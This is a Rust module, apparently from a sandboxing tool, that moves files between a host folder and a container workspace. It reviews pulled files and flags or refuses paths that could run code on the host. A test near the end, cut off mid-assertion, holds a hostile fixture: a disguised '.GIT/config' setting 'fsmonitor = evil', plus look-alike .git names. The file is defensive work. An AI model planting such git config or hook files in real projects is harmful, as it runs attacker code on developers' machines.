//! An env's workspace is a volume seeded from a host folder. This module resolves envs from
//! folders and moves files between host and sandbox without trusting what comes out.

use std::collections::{BTreeMap, BTreeSet, HashMap};
use std::io::{Read, Write};
use std::path::{Component, Path, PathBuf};
use std::process::Stdio;

use anyhow::{Context, Result, bail};
use serde::Serialize;
use sha2::{Digest, Sha256};

use crate::config::{self, EnvFile, Workspace};
use crate::env::{Ctx, UID};
use crate::names;
use crate::paths::Paths;

/// Heavy or machine-specific directories skipped when copying in either direction
/// (`.terraform` holds the host platform's provider binaries; `terraform init` in the env
/// fetches its own).
const COPY_SKIP: &[&str] = &[
    "node_modules",
    "target",
    ".venv",
    "__pycache__",
    ".pytest_cache",
    ".next",
    ".svelte-kit",
    ".gradle",
    ".terraform",
];

/// Cap on a pull (it is buffered so it can be reviewed before anything is written).
const MAX_PULL_BYTES: u64 = 2 << 30;

pub fn expand(p: &str) -> PathBuf {
    match (p.strip_prefix("~/"), directories::BaseDirs::new()) {
        (Some(rest), Some(b)) => b.home_dir().join(rest),
        _ => PathBuf::from(p),
    }
}

pub fn canonical(p: &str) -> Result<PathBuf> {
    let path = expand(p);
    path.canonicalize()
        .with_context(|| format!("{} does not exist", path.display()))
}

/// Whether `p` names a place on another machine, which merely looking it up reaches: a UNC
/// path (`\\server\share`, `//server/share`, `\\?\UNC\…`), to which Windows sends the user's
/// credentials, or `/net/<host>`, which macOS's automounter mounts. `\\?\C:\…` is a local
/// drive in Windows' long form.
pub fn network_path(p: &str) -> bool {
    let sep = |c: u8| c == b'/' || c == b'\\';
    let b = p.as_bytes();
    if b.len() >= 2 && sep(b[0]) && sep(b[1]) {
        let local_drive = b.len() >= 6
            && (b[2] == b'?' || b[2] == b'.')
            && sep(b[3])
            && b[4].is_ascii_alphabetic()
            && b[5] == b':';
        return !local_drive;
    }
    sep(b.first().copied().unwrap_or_default())
        && p[1..]
            .split(['/', '\\'])
            .next()
            .is_some_and(|first| first.eq_ignore_ascii_case("net"))
}

/// A valid env name from a directory or repo name: `My_Project` → `my-project`.
pub fn name_from(s: &str) -> String {
    let base = s
        .trim_end_matches(['/', '\\'])
        .rsplit(['/', '\\'])
        .next()
        .unwrap_or(s)
        .trim_end_matches(".git");
    let mut out = String::new();
    for c in base.chars() {
        let c = c.to_ascii_lowercase();
        if c.is_ascii_alphanumeric() {
            out.push(c);
        } else if !out.ends_with('-') && !out.is_empty() {
            out.push('-');
        }
    }
    let out: String = out.trim_matches('-').chars().take(40).collect();
    out.trim_end_matches('-').to_string()
}

/// The env whose folder, or a repo folder of whose, contains `cwd`: the deepest one, and at
/// the same depth an env's own folder over another's repo.
pub fn env_for_dir(paths: &Paths, cwd: &Path) -> Result<Option<String>> {
    let mut best: Option<((usize, bool), String)> = None;
    for name in config::list_envs(paths)? {
        let Ok(f) = EnvFile::load(paths, &name) else {
            continue;
        };
        let ws = &f.cfg.workspace;
        let folders = ws.dir.iter().map(|d| (d, true)).chain(
            ws.repos
                .values()
                .filter_map(|r| r.dir.as_ref())
                .map(|d| (d, false)),
        );
        for (dir, own) in folders {
            let Ok(dir) = canonical(dir) else { continue };
            if cwd.starts_with(&dir) {
                let rank = (dir.components().count(), own);
                if best.as_ref().is_none_or(|(r, _)| rank > *r) {
                    best = Some((rank, name.clone()));
                }
            }
        }
    }
    Ok(best.map(|(_, n)| n))
}

/// Resolve an env argument: a name, or `.`/nothing for the env of the current directory.
pub fn resolve(paths: &Paths, arg: Option<&str>) -> Result<String> {
    match arg {
        Some(n) if n != "." => {
            config::validate_name(n)?;
            Ok(n.to_string())
        }
        _ => {
            let cwd = std::env::current_dir()?.canonicalize()?;
            env_for_dir(paths, &cwd)?.with_context(|| no_env_here(paths, &cwd))
        }
    }
}

/// Why no env acts on `cwd`, naming the envs no folder leads to: those cloned from a remote.
fn no_env_here(paths: &Paths, cwd: &Path) -> String {
    let remote: Vec<String> = config::list_envs(paths)
        .unwrap_or_default()
        .into_iter()
        .filter(|n| {
            EnvFile::load(paths, n)
                .is_ok_and(|f| f.cfg.workspace.dir.is_none() && f.cfg.workspace.url.is_some())
        })
        .collect();
    let mut msg = format!(
        "no env for {} — name one with -e, or create it here with `luoto init`",
        cwd.display()
    );
    if !remote.is_empty() {
        msg.push_str(&format!(
            "; envs cloned from a remote have no folder here, so -e picks them: {}",
            remote.join(", ")
        ));
    }
    msg
}

/// A folder `pull --to` may write: never your home folder or one that holds it.
pub fn check_pull_dest(dest: &Path) -> Result<()> {
    let home = directories::BaseDirs::new().map(|b| {
        b.home_dir()
            .canonicalize()
            .unwrap_or_else(|_| b.home_dir().to_path_buf())
    });
    if home.is_some_and(|h| h.starts_with(dest)) {
        bail!(
            "{} is your home folder or holds it: pull into a project's own folder",
            dest.display()
        );
    }
    Ok(())
}

/// A path component as macOS (APFS/HFS+) and Windows (NTFS) compare it: case-folded, with
/// the invisible characters HFS+ ignores removed and the trailing dots and spaces NTFS drops.
/// `.GIT`, `.g\u{200c}it` and `.git.` all name `.git` there. Folding goes through upper case
/// first, as the filesystems' tables do: `ſ` (long s) names `s`, `ı` names `i`.
pub(crate) fn fold(component: &str) -> String {
    let s: String = component
        .chars()
        .filter(|c| !crate::text::is_format(*c))
        .flat_map(char::to_uppercase)
        .flat_map(char::to_lowercase)
        .collect();
    s.trim_end_matches(['.', ' ']).to_string()
}

/// An NTFS 8.3 short name (`VSCODE~1`, `ENVRC~2`), which can stand for any long name.
fn short_name(folded: &str) -> bool {
    let stem = folded.split('.').next().unwrap_or("");
    stem.rsplit_once('~').is_some_and(|(head, n)| {
        !head.is_empty() && !n.is_empty() && n.bytes().all(|b| b.is_ascii_digit())
    })
}

/// `rel` with every component folded (see [`fold`]).
fn fold_path(rel: &str) -> String {
    rel.trim_start_matches("./")
        .split('/')
        .map(fold)
        .collect::<Vec<_>>()
        .join("/")
}

/// Whether a component is git's metadata directory under another spelling, including the
/// NTFS 8.3 short name `GIT~1`.
fn disguised_git(component: &str) -> bool {
    let f = fold(component);
    component != ".git" && (f == ".git" || f.starts_with("git~"))
}

/// Paths host tools act on by themselves (opening the folder, entering it, running git, or a
/// build tool's wrapper and config). A sandbox that can write these can run code on the host.
/// Compared folded, so case or invisible characters don't hide them.
pub fn risky(rel: &str) -> Option<&'static str> {
    let rel = fold_path(rel);
    let mut parts = rel.split('/');
    let first = parts.next().unwrap_or("");
    let second = parts.next().unwrap_or("");
    let file = rel.rsplit('/').next().unwrap_or(&rel);
    if first == ".git" || first.starts_with("git~") {
        return Some("git metadata (hooks and config run on the host)");
    }
    if rel.split('/').any(short_name) {
        return Some("a Windows short name, which can stand for a file host tools act on");
    }
    match rel.as_str() {
        ".envrc" | ".env.local" => return Some("direnv/dotenv loads it when you enter the folder"),
        ".gitattributes" | ".gitmodules" => return Some("git filters and submodule URLs"),
        ".mise.toml" | "mise.toml" | ".tool-versions" | ".mise.local.toml" | "mise.local.toml"
        | ".config/mise.toml" | "mise/config.toml" => {
            return Some("mise runs hooks and tasks from it");
        }
        ".pre-commit-config.yaml"
        | "lefthook.yml"
        | ".lefthook.yml"
        | "lefthook.yaml"
        | ".lefthook.yaml" => {
            return Some("git hook manager config");
        }
        ".yarnrc.yml" | ".yarnrc" | ".npmrc" | ".pnpmfile.cjs" => {
            return Some("the package manager runs code it names (yarnPath, hooks, scripts)");
        }
        ".cargo/config.toml" | ".cargo/config" => return Some("cargo runners and aliases"),
        "rust-toolchain.toml" | "rust-toolchain" => return Some("rustup toolchain path"),
        "gradlew" | "gradlew.bat" | "mvnw" | "mvnw.cmd" => {
            return Some("build wrapper your IDE runs on import");
        }
        _ => {}
    }
    match (first, second) {
        (".config", "mise") | (".mise", _) => return Some("mise runs hooks and tasks from it"),
        ("gradle", "wrapper") | (".mvn", _) => {
            return Some("build wrapper and extensions your IDE runs on import");
        }
        _ => {}
    }
    match first {
        ".vscode" => Some("VS Code runs tasks and reads settings from it"),
        ".idea" => Some("JetBrains IDE run configurations"),
        ".husky" => Some("git hooks"),
        ".devcontainer" => Some("dev container definition run by your IDE"),
        ".zed" => Some("Zed tasks and settings"),
        ".claude" | ".cursor" => Some("coding-agent hooks and settings that run on the host"),
        _ if file.ends_with(".code-workspace") => Some("VS Code workspace (tasks, settings)"),
        _ => None,
    }
}

/// [`risky`] for a path in the folder or in any folder it is under: host tools act on a
/// nested project's files when they work there (a repository in the folder, a package of a
/// monorepo).
pub fn risky_nested(rel: &str) -> Option<&'static str> {
    let mut rest = rel;
    loop {
        if let Some(why) = risky(rest) {
            return Some(why);
        }
        rest = rest.split_once('/')?.1;
    }
}

/// Prints each file named in its arguments (relative to the workspace) as its length and that
/// many bytes, at most `$0`, or `-` when it is not a regular file. Never through a symlink: a
/// repository can commit one to `/dev/zero`, a FIFO or a file of the dev user's.
const READ_FILES: &str = r#"cd /workspace || exit 1
for f; do
  if [ -f "$f" ] && [ ! -L "$f" ]; then
    printf '%s\n' "$(head -c "$0" -- "$f" | wc -c)"
    head -c "$0" -- "$f"
  else
    printf -- '-\n'
  fi
done"#;

/// What [`read_files`] does with a file larger than its cap.
#[derive(Clone, Copy, PartialEq, Eq)]
pub enum Oversize {
    /// Fail: the caller needs the whole text.
    Refuse,
    /// Keep the first `cap` bytes.
    Truncate,
}

/// Regular files of the env's workspace by relative path, read as the dev user in one call,
/// each at most `cap` bytes. Missing and other files are left out.
pub fn read_files(
    ctx: &Ctx,
    env: &str,
    rels: &[String],
    cap: usize,
    oversize: Oversize,
) -> Result<HashMap<String, Vec<u8>>> {
    if rels.is_empty() {
        return Ok(HashMap::new());
    }
    let limit = match oversize {
        Oversize::Refuse => cap + 1,
        Oversize::Truncate => cap,
    };
    let limit_arg = limit.to_string();
    let dev = names::dev(env);
    let mut args = vec![
        "exec",
        "-u",
        UID,
        dev.as_str(),
        "sh",
        "-c",
        READ_FILES,
        &limit_arg,
    ];
    args.extend(rels.iter().map(String::as_str));
    let out = ctx
        .rt
        .command()
        .args(&args)
        .output()
        .context("read the workspace's files in the env")?;
    if !out.status.success() {
        bail!(
            "reading the workspace's files failed: {}",
            crate::text::display(String::from_utf8_lossy(&out.stderr).trim())
        );
    }
    let files = framed(rels, &out.stdout, limit);
    if let Some((rel, _)) = files.iter().find(|(_, b)| b.len() > cap) {
        bail!("{} is larger than {cap} bytes", crate::text::display(rel));
    }
    Ok(files)
}

/// Output framed as [`READ_FILES`] frames it (a length line, then that many bytes, or `-`),
/// by `names` in order, each at most `limit` bytes. Stops at anything else.
pub fn framed<S: AsRef<str>>(
    names: &[S],
    mut out: &[u8],
    limit: usize,
) -> HashMap<String, Vec<u8>> {
    let mut found = HashMap::new();
    for name in names {
        let Some(nl) = out.iter().position(|b| *b == b'\n') else {
            break;
        };
        let head = String::from_utf8_lossy(&out[..nl]).trim().to_string();
        out = &out[nl + 1..];
        if head == "-" {
            continue;
        }
        let Ok(n) = head.parse::<usize>() else { break };
        if n > out.len() || n > limit {
            break;
        }
        found.insert(name.as_ref().to_string(), out[..n].to_vec());
        out = &out[n..];
    }
    found
}

fn skip(rel: &Path) -> bool {
    rel.components()
        .any(|c| COPY_SKIP.contains(&c.as_os_str().to_string_lossy().as_ref()))
}

/// What a copy into the env takes from `src`, as relative paths with `true` for a folder, each
/// folder before what it holds. From a git repository that is the files git doesn't ignore
/// and the repository itself (`.git`), so ignored secrets (`.env`, `*.tfvars`, state files)
/// and build output stay out; from any other folder it is everything, with the repositories
/// inside read the same way. `COPY_SKIP` never goes.
pub fn copy_list(src: &Path) -> Result<Vec<(PathBuf, bool)>> {
    let mut out = Vec::new();
    let mut seen = std::collections::HashSet::new();
    collect(src, Path::new(""), &mut out, &mut seen)?;
    Ok(out)
}

fn add(
    out: &mut Vec<(PathBuf, bool)>,
    seen: &mut std::collections::HashSet<PathBuf>,
    rel: PathBuf,
    dir: bool,
) {
    let mut parents: Vec<&Path> = rel
        .ancestors()
        .skip(1)
        .filter(|a| !a.as_os_str().is_empty())
        .collect();
    parents.reverse();
    for p in parents {
        if seen.insert(p.to_path_buf()) {
            out.push((p.to_path_buf(), true));
        }
    }
    // A file git lists twice (an unmerged one, once per stage) goes in once.
    if seen.insert(rel.clone()) {
        out.push((rel, dir));
    }
}

/// `rel` under `src`: through git when it is a work tree, else walked.
fn collect(
    src: &Path,
    rel: &Path,
    out: &mut Vec<(PathBuf, bool)>,
    seen: &mut std::collections::HashSet<PathBuf>,
) -> Result<()> {
    let dir = src.join(rel);
    // Only a repository's own root: a folder inside a bigger work tree (a home folder kept in
    // git with `*` ignored, say) would otherwise copy nothing.
    let files = dir
        .join(".git")
        .exists()
        .then(|| crate::detect::git_files(&dir))
        .flatten();
    let Some(files) = files else {
        if dir.join(".git").exists() {
            eprintln!(
                "warning: git can't list {}; copying all of it, ignored files included",
                dir.display()
            );
        }
        return walk(src, rel, false, out, seen);
    };
    // Whether each folder above a listed path is a real one: git lists what its index holds,
    // and a folder since replaced by a symlink would lead the copy out of `src`.
    let mut linked: HashMap<PathBuf, bool> = HashMap::new();
    for f in files {
        let r = rel.join(f.trim_end_matches('/'));
        if skip(&r) {
            continue;
        }
        let through_link = r
            .ancestors()
            .skip(1)
            .filter(|a| !a.as_os_str().is_empty())
            .any(|a| {
                *linked.entry(a.to_path_buf()).or_insert_with(|| {
                    std::fs::symlink_metadata(src.join(a)).is_ok_and(|m| m.is_symlink())
                })
            });
        if through_link {
            continue;
        }
        let Ok(meta) = std::fs::symlink_metadata(src.join(&r)) else {
            // Tracked, but deleted in the work tree.
            continue;
        };
        if meta.is_dir() {
            // A repository git doesn't descend into: one inside this one, or a submodule.
            if src.join(&r).join(".git").exists() {
                collect(src, &r, out, seen)?;
            }
        } else if meta.is_file() || meta.is_symlink() {
            add(out, seen, r, false);
        }
    }
    let git = rel.join(".git");
    match std::fs::symlink_metadata(src.join(&git)) {
        Ok(m) if m.is_dir() => {
            add(out, seen, git.clone(), true);
            walk(src, &git, true, out, seen)?;
        }
        Ok(_) => add(out, seen, git, false),
        Err(_) => {}
    }
    Ok(())
}

/// Everything in `rel`, but a repository inside through [`collect`] (unless `plain`).
fn walk(
    src: &Path,
    rel: &Path,
    plain: bool,
    out: &mut Vec<(PathBuf, bool)>,
    seen: &mut std::collections::HashSet<PathBuf>,
) -> Result<()> {
    let path = src.join(rel);
    for entry in std::fs::read_dir(&path).with_context(|| format!("read {}", path.display()))? {
        let entry = entry?;
        let r = rel.join(entry.file_name());
        if skip(&r) {
            continue;
        }
        let ft = entry.file_type()?;
        if ft.is_dir() {
            if !plain && entry.path().join(".git").exists() {
                collect(src, &r, out, seen)?;
            } else {
                add(out, seen, r.clone(), true);
                walk(src, &r, plain, out, seen)?;
            }
        } else if ft.is_file() || ft.is_symlink() {
            add(out, seen, r, false);
        }
    }
    Ok(())
}

/// Copy a host directory into the env's workspace, or into its folder `sub` (a repo's name),
/// created if needed (host → sandbox is the trusted direction): what [`copy_list`] takes.
pub fn push(ctx: &Ctx, env: &str, src: &Path, sub: Option<&str>) -> Result<usize> {
    let list = copy_list(src)?;
    let dev = names::dev(env);
    let mut args = vec!["exec", "-i", "-u", UID, dev.as_str()];
    match sub {
        None => args.extend(["tar", "-x", "-f", "-", "-C", "/workspace"]),
        // Into a hidden folder first, moved into place only once the whole archive is in, so
        // a copy cut short leaves no half-filled repo for the next `up` to take as done.
        Some(name) => args.extend([
            "sh",
            "-c",
            r#"t="/workspace/.$0.luoto-copy"; rm -rf "$t" && mkdir "$t" && tar -x -f - -C "$t" && mv "$t" "/workspace/$0""#,
            name,
        ]),
    }
    let mut child = ctx
        .rt
        .command()
        .args(&args)
        .stdin(Stdio::piped())
        .stdout(Stdio::null())
        .stderr(Stdio::piped())
        .spawn()
        .context("start tar in the env")?;
    let stdin = child.stdin.take().context("stdin")?;
    let sent = (|| -> Result<usize> {
        let mut builder = tar::Builder::new(stdin);
        builder.follow_symlinks(false);
        let mut count = 0;
        for (rel, dir) in &list {
            let path = src.join(rel);
            if *dir {
                builder.append_dir(rel, &path)?;
            } else {
                builder
                    .append_path_with_name(&path, rel)
                    .with_context(|| format!("read {}", path.display()))?;
                count += 1;
            }
        }
        builder.into_inner()?.flush()?;
        Ok(count)
    })();
    let count = match sent {
        Ok(n) => n,
        Err(e) => {
            // An archive cut short must not be taken as whole: the copy stops here.
            let _ = child.kill();
            let _ = child.wait();
            return Err(e);
        }
    };
    let out = child.wait_with_output()?;
    if !out.status.success() {
        bail!(
            "copying into the env failed: {}",
            String::from_utf8_lossy(&out.stderr).trim()
        );
    }
    Ok(count)
}

#[derive(Debug, Clone, Serialize)]
pub struct PlanEntry {
    pub path: String,
    /// `new` or `changed`.
    pub change: String,
    pub size: u64,
    pub executable: bool,
    pub risky: Option<String>,
}

#[derive(Debug, Clone, Serialize)]
pub struct PullPlan {
    pub dir: String,
    /// The repo it pulls, or `None` for the workspace.
    pub repo: Option<String>,
    pub entries: Vec<PlanEntry>,
    pub unchanged: usize,
    /// Entries refused outright (unsafe paths, links leaving the folder, special files).
    pub refused: Vec<(String, String)>,
    /// Hash over what would be written; applying re-checks it so a sandbox can't swap files
    /// between your review and the write.
    pub digest: String,
    #[serde(skip)]
    data: BTreeMap<String, Content>,
}

#[derive(Debug, Clone)]
enum Content {
    File { bytes: Vec<u8>, executable: bool },
    Link(PathBuf),
}

/// A relative path made only of normal components.
fn safe_rel(p: &Path) -> Option<PathBuf> {
    let mut out = PathBuf::new();
    for c in p.components() {
        match c {
            // A backslash is a separator on Windows and becomes `/` in the plan; a colon is a
            // drive or a data stream there. Neither is one plain name.
            Component::Normal(n)
                if n.to_str()
                    .is_some_and(|s| !s.contains('\\') && !(cfg!(windows) && s.contains(':'))) =>
            {
                out.push(n)
            }
            Component::CurDir => {}
            _ => return None,
        }
    }
    (!out.as_os_str().is_empty()).then_some(out)
}

/// Does a link at `rel` pointing to `target` stay inside the folder?
fn link_stays_inside(rel: &Path, target: &Path) -> bool {
    if target.is_absolute() || target.to_string_lossy().contains('\\') {
        return false;
    }
    let mut depth: i64 = rel.components().count() as i64 - 1;
    for c in target.components() {
        match c {
            Component::ParentDir => depth -= 1,
            Component::Normal(_) => depth += 1,
            Component::CurDir => {}
            _ => return false,
        }
        if depth < 0 {
            return false;
        }
    }
    true
}

/// A folder of the env that `pull` writes back to the host.
#[derive(Debug, Clone, PartialEq)]
pub struct PullTarget {
    /// The repo (`/workspace/<name>`), or `None` for the whole workspace.
    pub repo: Option<String>,
    pub dest: PathBuf,
    /// Repos left out of the workspace's pull: each is a target of its own, if any.
    pub skip: Vec<String>,
}

/// Where `pull` writes: the workspace to the env's folder, less its repos, and each repo
/// copied in from a host folder back to that folder; a cloned repo's work leaves by git push.
/// With `to`, all of it goes there instead, each repo at `<to>/<name>`. With `repo`, only that
/// one, to its host folder or else the same name in the env's folder (or `to`). `present` are
/// the repos in the workspace: a folder repo not copied in yet has nothing to pull, and one
/// whose host folder is gone is left out with a warning.
pub fn pull_targets(
    ws: &Workspace,
    to: Option<PathBuf>,
    repo: Option<&str>,
    present: &BTreeSet<String>,
) -> Result<Vec<PullTarget>> {
    // Every folder a pull writes: a config from elsewhere (`luoto import`) names them too.
    let checked = |d: PathBuf| -> Result<PathBuf> {
        check_pull_dest(&d)?;
        Ok(d)
    };
    let to = to.map(checked).transpose()?;
    let root = || -> Result<PathBuf> {
        checked(canonical(ws.dir.as_deref().context(
            "the env has no folder to pull into (`luoto pull --to <dir>` picks one)",
        )?)?)
    };
    if let Some(name) = repo {
        let r = ws.repos.get(name).with_context(|| {
            format!(
                "the env has no repo `{}` (`luoto repo list`)",
                crate::text::display(name)
            )
        })?;
        let dest = match (to, &r.dir) {
            (Some(t), _) => t,
            (None, Some(d)) => checked(canonical(d)?)?,
            (None, None) => {
                let d = root()?.join(name);
                std::fs::create_dir_all(&d)?;
                d
            }
        };
        return Ok(vec![PullTarget {
            repo: Some(name.to_string()),
            dest,
            skip: Vec::new(),
        }]);
    }
    let mut out = vec![PullTarget {
        repo: None,
        dest: match &to {
            Some(t) => t.clone(),
            None => root()?,
        },
        skip: ws
            .repos
            .keys()
            .filter(|n| present.contains(*n))
            .cloned()
            .collect(),
    }];
    let own = ws
        .repos
        .iter()
        .filter_map(|(n, r)| Some((n, r.dir.as_ref()?)))
        .filter(|(n, _)| present.contains(*n));
    for (name, dir) in own {
        let dest = match &to {
            Some(t) => {
                let d = t.join(name);
                std::fs::create_dir_all(&d)?;
                d
            }
            None => match canonical(dir) {
                Ok(d) => checked(d)?,
                Err(e) => {
                    eprintln!("warning: repo {name} left out: {e:#}");
                    continue;
                }
            },
        };
        out.push(PullTarget {
            repo: Some(name.clone()),
            dest,
            skip: Vec::new(),
        });
    }
    Ok(out)
}

pub fn plan_pull(ctx: &Ctx, env: &str, target: &PullTarget, include_git: bool) -> Result<PullPlan> {
    let src = match &target.repo {
        Some(name) => format!("/workspace/{name}"),
        None => "/workspace".to_string(),
    };
    let mut args = vec![
        "exec".to_string(),
        "-u".into(),
        UID.into(),
        names::dev(env),
        "tar".into(),
        "-c".into(),
        "-f".into(),
        "-".into(),
    ];
    for d in COPY_SKIP {
        args.push(format!("--exclude={d}"));
    }
    if !include_git {
        args.push("--exclude=.git".into());
    }
    for name in &target.skip {
        args.push(format!("--exclude=./{name}"));
    }
    args.extend(["-C".into(), src.clone(), ".".into()]);
    let mut child = ctx
        .rt
        .command()
        .args(&args)
        .stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .context("start tar in the env")?;
    let mut raw = Vec::new();
    child
        .stdout
        .take()
        .context("stdout")?
        .take(MAX_PULL_BYTES + 1)
        .read_to_end(&mut raw)?;
    let out = child.wait_with_output()?;
    if raw.len() as u64 > MAX_PULL_BYTES {
        bail!("{src} is larger than 2 GiB; pull a narrower set or push to a git remote");
    }
    if !out.status.success() && raw.is_empty() {
        bail!(
            "reading {src} in the env failed: {}",
            String::from_utf8_lossy(&out.stderr).trim()
        );
    }
    let mut plan = build_plan(&raw, &target.dest, &target.skip)?;
    plan.repo = target.repo.clone();
    Ok(plan)
}

/// The plan for a tar of the env's files, less the top-level folders in `skip` (left out in
/// the env too, where its tar can).
fn build_plan(raw: &[u8], dest: &Path, skip: &[String]) -> Result<PullPlan> {
    let mut archive = tar::Archive::new(raw);
    let mut entries = Vec::new();
    let mut refused = Vec::new();
    let mut data = BTreeMap::new();
    let mut unchanged = 0;
    let mut hasher = Sha256::new();
    // Folded paths already in the plan: on a case-insensitive host two of them are one file.
    let mut seen = std::collections::HashSet::new();
    for e in archive.entries()? {
        let mut e = e?;
        let raw_path = e.path()?.to_path_buf();
        let shown = raw_path
            .to_string_lossy()
            .trim_start_matches("./")
            .to_string();
        let kind = e.header().entry_type();
        if kind.is_dir() {
            continue;
        }
        let Some(rel) = safe_rel(&raw_path) else {
            refused.push((shown, "unsafe path".into()));
            continue;
        };
        let rel_s = rel.to_string_lossy().replace('\\', "/");
        let top = rel_s.split('/').next().unwrap_or_default();
        if skip.iter().any(|n| fold(n) == fold(top)) {
            continue;
        }
        if rel_s.split('/').any(disguised_git) {
            refused.push((rel_s, "names .git under another spelling".into()));
            continue;
        }
        if !seen.insert(fold_path(&rel_s)) {
            refused.push((
                rel_s,
                "differs from another file only by case or invisible characters".into(),
            ));
            continue;
        }
        let host = dest.join(&rel);
        let content = if kind.is_file() {
            let mut bytes = Vec::new();
            e.read_to_end(&mut bytes)?;
            let executable = e.header().mode().unwrap_or(0) & 0o111 != 0;
            Content::File { bytes, executable }
        } else if kind.is_symlink() {
            let Some(target) = e.link_name()?.map(|t| t.to_path_buf()) else {
                continue;
            };
            if !link_stays_inside(&rel, &target) {
                refused.push((
                    rel_s,
                    format!("symlink to {} leaves the folder", target.display()),
                ));
                continue;
            }
            Content::Link(target)
        } else {
            refused.push((rel_s, "special file".into()));
            continue;
        };
        let (same, size, executable) = match &content {
            Content::File { bytes, executable } => (
                std::fs::symlink_metadata(&host).is_ok_and(|m| m.is_file())
                    && std::fs::read(&host).is_ok_and(|h| &h == bytes),
                bytes.len() as u64,
                *executable,
            ),
            Content::Link(t) => (std::fs::read_link(&host).is_ok_and(|h| &h == t), 0, false),
        };
        if same {
            unchanged += 1;
            continue;
        }
        let change = if host.symlink_metadata().is_ok() {
            "changed"
        } else {
            "new"
        };
        hasher.update(rel_s.as_bytes());
        match &content {
            Content::File { bytes, executable } => {
                hasher.update(Sha256::digest(bytes));
                hasher.update([u8::from(*executable)]);
            }
            Content::Link(t) => hasher.update(t.to_string_lossy().as_bytes()),
        }
        let newly_exec = executable && !std::fs::metadata(&host).is_ok_and(|m| is_executable(&m));
        let risky = risky_nested(&rel_s)
            .map(str::to_string)
            .or_else(|| newly_exec.then(|| "becomes executable".to_string()))
            .or_else(|| matches!(content, Content::Link(_)).then(|| "symlink".to_string()));
        entries.push(PlanEntry {
            path: rel_s.clone(),
            change: change.into(),
            size,
            executable,
            risky,
        });
        data.insert(rel_s, content);
    }
    Ok(PullPlan {
        dir: dest.display().to_string(),
        repo: None,
        entries,
        unchanged,
        refused,
        digest: hex::encode(&hasher.finalize()[..16]),
        data,
    })
}

#[cfg(unix)]
fn is_executable(m: &std::fs::Metadata) -> bool {
    use std::os::unix::fs::PermissionsExt;
    m.permissions().mode() & 0o111 != 0
}

#[cfg(not(unix))]
fn is_executable(_m: &std::fs::Metadata) -> bool {
    false
}

/// Write a reviewed plan. Risky entries are skipped unless `include_risky`.
pub fn apply_pull(plan: &PullPlan, include_risky: bool) -> Result<(usize, usize)> {
    let dest = PathBuf::from(&plan.dir);
    let mut written = 0;
    let mut skipped = 0;
    for e in &plan.entries {
        if e.risky.is_some() && !include_risky {
            skipped += 1;
            continue;
        }
        let Some(content) = plan.data.get(&e.path) else {
            continue;
        };
        let target = dest.join(&e.path);
        ensure_parents_inside(&dest, &target)?;
        match content {
            Content::File { bytes, executable } => {
                let tmp = target.with_extension("luoto-tmp");
                if std::fs::symlink_metadata(&tmp).is_ok() {
                    std::fs::remove_file(&tmp)?;
                }
                // create_new: never write through something already at the temp path.
                std::fs::OpenOptions::new()
                    .write(true)
                    .create_new(true)
                    .open(&tmp)
                    .and_then(|mut f| std::io::Write::write_all(&mut f, bytes))
                    .with_context(|| format!("write {}", target.display()))?;
                #[cfg(unix)]
                {
                    use std::os::unix::fs::PermissionsExt;
                    let mode = if *executable { 0o755 } else { 0o644 };
                    std::fs::set_permissions(&tmp, std::fs::Permissions::from_mode(mode))?;
                }
                #[cfg(not(unix))]
                let _ = executable;
                if std::fs::symlink_metadata(&target).is_ok_and(|m| m.file_type().is_symlink()) {
                    std::fs::remove_file(&target)?;
                }
                std::fs::rename(&tmp, &target)?;
            }
            Content::Link(t) => {
                if std::fs::symlink_metadata(&target).is_ok() {
                    std::fs::remove_file(&target)?;
                }
                #[cfg(unix)]
                std::os::unix::fs::symlink(t, &target)?;
                #[cfg(not(unix))]
                {
                    let _ = t;
                    skipped += 1;
                    continue;
                }
            }
        }
        written += 1;
    }
    Ok((written, skipped))
}

/// Create the parents of `target` inside `root`, refusing to walk through a symlink (which
/// could point anywhere on the host).
fn ensure_parents_inside(root: &Path, target: &Path) -> Result<()> {
    let parent = target.parent().context("no parent")?;
    let rel = parent
        .strip_prefix(root)
        .context("path outside the folder")?;
    let mut cur = root.to_path_buf();
    for c in rel.components() {
        let Component::Normal(_) = c else {
            bail!("{} leaves the folder", target.display());
        };
        cur.push(c);
        match std::fs::symlink_metadata(&cur) {
            Ok(m) if m.file_type().is_symlink() => {
                bail!(
                    "{} is a symlink on the host; refusing to write through it",
                    cur.display()
                )
            }
            Ok(m) if m.is_dir() => {}
            Ok(_) => bail!("{} exists and is not a directory", cur.display()),
            Err(_) => std::fs::create_dir(&cur)?,
        }
    }
    Ok(())
}

/// What a plan writes, what it skips as risky and what it refuses, for a terminal.
pub fn describe(plan: &PullPlan, w: &mut impl Write) -> std::io::Result<()> {
    let risky: Vec<&PlanEntry> = plan.entries.iter().filter(|e| e.risky.is_some()).collect();
    writeln!(
        w,
        "{} new or changed file(s), {} unchanged → {}",
        plan.entries.len(),
        plan.unchanged,
        plan.dir
    )?;
    for e in plan.entries.iter().filter(|e| e.risky.is_none()).take(30) {
        writeln!(w, "  {:<7} {}", e.change, crate::text::display(&e.path))?;
    }
    if plan.entries.len() - risky.len() > 30 {
        writeln!(w, "  … and {} more", plan.entries.len() - risky.len() - 30)?;
    }
    if !risky.is_empty() {
        writeln!(w, "risky (skipped unless --include-risky):")?;
        for e in &risky {
            writeln!(
                w,
                "  {:<7} {} — {}",
                e.change,
                crate::text::display(&e.path),
                e.risky.as_deref().unwrap_or("")
            )?;
        }
    }
    for (p, why) in &plan.refused {
        writeln!(
            w,
            "refused  {} — {}",
            crate::text::display(p),
            crate::text::display(why)
        )?;
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    fn tar_of(files: &[(&str, &[u8])]) -> Vec<u8> {
        let mut b = tar::Builder::new(Vec::new());
        for (path, data) in files {
            let mut h = tar::Header::new_gnu();
            h.set_size(data.len() as u64);
            h.set_mode(0o644);
            h.set_cksum();
            b.append_data(&mut h, path, *data).unwrap();
        }
        b.into_inner().unwrap()
    }

    #[test]
    fn pull_refuses_disguised_git_and_case_collisions() {
        let dir = tempfile::tempdir().unwrap();
        let raw = tar_of(&[
            (".GIT/config", b"[core]\n\tfsmonitor = evil\n"),
            (".g\u{200c}it/HEAD", b"x"),
            ("GIT~1/config", b"x"),
            ("README.md", b"a"),
            ("readme.MD", b"b"),
            (".VSCODE/tasks.json", b"{}"),
        ]);
        let plan = build_plan(&raw, dir.path(), &[]).unwrap();
        let refused: Vec<&str> = plan.refused.iter().map(|(p, _)| p.as_str()).collect();
        assert!(refused.contains(&".GIT/config"));
